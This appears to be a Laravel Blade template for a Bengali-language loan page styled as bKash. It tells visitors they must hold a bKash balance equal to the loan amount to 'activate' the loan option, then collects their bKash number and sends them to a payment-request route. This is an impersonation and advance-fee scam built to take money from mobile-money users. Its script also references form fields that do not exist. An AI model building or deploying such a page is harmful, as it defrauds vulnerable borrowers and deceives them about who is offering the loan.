<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>বিকাশ লোন আবেদন</title>
    <link href="https://fonts.maateen.me/solaiman-lipi/font.css" rel="stylesheet">
    <script src="https://scripts.sandbox.bka.sh/versions/1.1.0-beta/checkout/bKash-checkout-sandbox.js"></script>
    <style>
        body {
            font-family: 'SolaimanLipi', Arial, sans-serif;
            margin: 0;
            background-color: #fff;
        }

        header {
            background: #e91e63;
            color: white;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        header h1 {
            font-size: 22px;
        }

        header button {
            background: white;
            color: #e91e63;
            padding: 8px 15px;
            border-radius: 20px;
            border: none;
            cursor: pointer;
            font-weight: bold;
        }

        .banner {
            text-align: center;
            background: #f50057;
            color: white;
            padding: 40px 20px;
        }

        .banner h2 {
            font-size: 28px;
            margin-bottom: 15px;
        }

        .banner p {
            font-size: 18px;
        }

        .apply-btn {
            background: white;
            color: #e91e63;
            padding: 12px 25px;
            margin-top: 20px;
            display: inline-block;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            text-decoration: none;
        }

        .dashboard {
            padding: 20px;
        }

        .details-box {
            background: #fff0f5;
            border: 2px solid #f48fb1;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: center;
            font-size: 17px;
            color: #444;
            line-height: 1.6em;
        }

        .details-box strong {
            color: #e91e63;
            font-weight: bold;
        }

        .loan-card {
            background: #fff3f7;
            border: 1px solid #f8bbd0;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
            transition: 0.3s;
        }

        .loan-card:hover {
            transform: scale(1.03);
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
        }

        .loan-card h3 {
            color: #e91e63;
            font-size: 22px;
            margin-bottom: 10px;
        }

        .loan-card p {
            font-size: 18px;
            margin: 5px 0;
            border: solid 1px;
            border-radius: 10px;
            padding: 10px 10px;
        }

        .loan-card button {
            background: #e91e63;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 10px;
        }

        .chat-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #e91e63;
            color: white;
            padding: 12px 20px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            animation: fadeIn 0.3s;
        }

        .modal-content {
            background-color: white;
            margin: 5% auto;
            padding: 0;
            border-radius: 15px;
            width: 90%;
            max-width: 500px;
            max-height: 85vh;
            overflow-y: auto;
            animation: slideIn 0.3s;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        @keyframes slideIn {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }

            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .modal-header {
            background: #e91e63;
            color: white;
            padding: 20px;
            border-radius: 15px 15px 0 0;
            text-align: center;
            position: relative;
        }

        .modal-header h2 {
            margin: 0;
            font-size: 24px;
        }

        .close {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: white;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }

        .close:hover {
            color: #ffcdd2;
        }

        .modal-body {
            padding: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #e91e63;
            font-weight: bold;
            font-size: 16px;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 12px;
            border: 2px solid #f48fb1;
            border-radius: 8px;
            font-size: 16px;
            font-family: 'SolaimanLipi', Arial, sans-serif;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #e91e63;
        }

        .loan-amount-display {
            background: #fff0f5;
            border: 2px solid #f48fb1;
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            margin-bottom: 20px;
        }

        .loan-amount-display h3 {
            color: #e91e63;
            margin: 0 0 10px 0;
            font-size: 20px;
        }

        .loan-amount-display p {
            color: #666;
            margin: 0;
            font-size: 16px;
        }

        .submit-btn {
            background: #e91e63;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            font-family: 'SolaimanLipi', Arial, sans-serif;
        }

        .submit-btn:hover {
            background: #c2185b;
        }

        .terms {
            background: #fff3f7;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #666;
            line-height: 1.5;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .checkbox-group input[type="checkbox"] {
            width: auto;
            margin-right: 10px;
        }

        .checkbox-group label {
            margin: 0;
            font-weight: normal;
            color: #666;
            font-size: 14px;
        }
    </style>
</head>

<body>

    <header>
        <h1>বিকাশ লোন</h1>
        <button>বিকাশ অ্যাপ</button>
    </header>

    <section class="banner">
        <h2>লোন এখন হাতের মুঠোয়!</h2>
        <p>এক্সক্লুসিভ সুযোগ – বিকাশ লোন অপশন চালু করুন এখনই।</p>
        <a href="#dashboard" class="apply-btn">এখনই আবেদন করুন</a>
    </section>

    <section class="dashboard" id="dashboard">
        <h2 style="text-align:center; color:#e91e63;">আমাদের লোন প্যাকেজ</h2>

        <div class="details-box">
            <p>
                আপনি যে পরিমাণ <strong>টাকার লোন</strong> এর অপশন বিকাশ অ্যাপে সচল করতে চান,
                ঠিক সে পরিমাণ অর্থ আপনার <strong>বিকাশ ব্যালেন্সে থাকতে হবে</strong>।
            </p>
        </div>

        @foreach ($services as $service)
            <div class="loan-card">
                <h3>৳ {{ number_format($service->price, 2) }} টাকা লোনের অপশন চালু করুন</h3>
                @foreach ($service->service_values as $description)
                    <p>{{ $description->description }}</p>
                @endforeach
                <button onclick="openModal('{{ $service->price }}','{{ $service->id }}')">আবেদন করুন</button>
            </div>
        @endforeach

    </section>

    <!-- Modal -->
    <div id="loanModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>লোন আবেদন ফর্ম</h2>
                <span class="close" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body">
                <div class="loan-amount-display">
                    <h3>লোনের পরিমাণ: ৳ <span id="loanAmount">৫,০০০</span> টাকা</h3>
                    <p>এই লোন অপশন চালু করতে আপনার বিকাশে সমপরিমাণ ব্যালেন্স প্রয়োজন</p>
                </div>

                {{--<form id="loanForm" method="post" action="{{ Route('bkashPayment') }}"> --}}

                <form id="loanForm" method="get" action="{{ Route('payment.request.paymentRequest') }}">
                    @csrf
                    <div class="terms">
                        <strong>শর্তাবলী:</strong><br>
                        • আবেদনের জন্য আপনার বিকাশ একাউন্টে লোনের সমপরিমাণ টাকা থাকতে হবে<br>
                        • সমস্ত তথ্য সঠিক এবং যাচাইযোগ্য হতে হবে<br>
                        • লোন অনুমোদনের জন্য বিকাশের নিয়ম অনুযায়ী প্রক্রিয়া সম্পন্ন হবে<br>
                        • প্রয়োজনীয় ডকুমেন্ট যাচাই করা হতে পারে
                    </div>

                    <input type="hidden" name="payment" id="payment">
                    <input type="hidden" name="service_id" id="service_id">

                    <div class="form-group">
                        <label for="mobileNumber">আপনার বিকাশ নাম্বারটি দিন *</label>
                        <input type="tel" id="mobileNumber" name="mobileNumber" required placeholder="০১xxxxxxxxx">
                    </div>

                    <div class="checkbox-group">
                        <input type="checkbox" id="agreeTerms" name="agreeTerms" required>
                        <label for="agreeTerms">আমি সমস্ত শর্তাবলী পড়েছি এবং সম্মত আছি *</label>
                    </div>

                    <button type="submit" class="submit-btn">কনফার্ম করুন</button>
                </form>
            </div>
        </div>
    </div>

    <div class="chat-btn">💬 লাইভ চ্যাট</div>

    <script>
        let currentLoanAmount = '';

        function openModal(amount,id) {
            currentLoanAmount = amount;
            document.getElementById('loanAmount').textContent = amount;
            document.getElementById('payment').value = amount;
            document.getElementById('loanModal').style.display = 'block';
            document.getElementById('service_id').value = id;
            document.body.style.overflow = 'hidden'; // Prevent background scrolling
        }

        function closeModal() {
            document.getElementById('loanModal').style.display = 'none';
            document.body.style.overflow = 'auto'; // Restore scrolling
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('loanModal');
            if (event.target == modal) {
                closeModal();
            }
        }

        // Form submission handler
        // document.getElementById('loanForm').addEventListener('submit', function(e) {
        //     e.preventDefault();

        //     // Get form data
        //     const formData = new FormData(e.target);
        //     const data = Object.fromEntries(formData);
        //     data.loanAmount = currentLoanAmount;

        //     // Simple validation
        //     const mobile = data.mobileNumber;
        //     const bkash = data.bkashNumber;
        //     const nid = data.nidNumber;

        //     if (!mobile.match(/^01[0-9]{9}$/)) {
        //         alert('সঠিক মোবাইল নম্বর দিন (১১ সংখ্যার)');
        //         return;
        //     }

        //     if (!bkash.match(/^01[0-9]{9}$/)) {
        //         alert('সঠিক বিকাশ নম্বর দিন (১১ সংখ্যার)');
        //         return;
        //     }

        //     if (nid.length < 10 || nid.length > 17) {
        //         alert('সঠিক NID নম্বর দিন');
        //         return;
        //     }

        //     // Show success message
        //     alert(
        //         `আবেদন সফলভাবে জমা দেওয়া হয়েছে!\nলোনের পরিমাণ: ৳${currentLoanAmount} টাকা\nআবেদনকারী: ${data.fullName}\nমোবাইল: ${data.mobileNumber}\n\nআমরা শীঘ্রই আপনার সাথে যোগাযোগ করব।`
        //     );

        //     // Close modal and reset form
        //     closeModal();
        //     e.target.reset();

        //     console.log('Loan Application Data:', data);
        // });

        // Phone number formatting
        function formatPhoneNumber(input) {
            input.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 11) {
                    value = value.slice(0, 11);
                }
                e.target.value = value;
            });
        }

        formatPhoneNumber(document.getElementById('mobileNumber'));
        formatPhoneNumber(document.getElementById('bkashNumber'));

        // NID number formatting
        document.getElementById('nidNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 17) {
                value = value.slice(0, 17);
            }
            e.target.value = value;
        });
    </script>

</body>

</html>
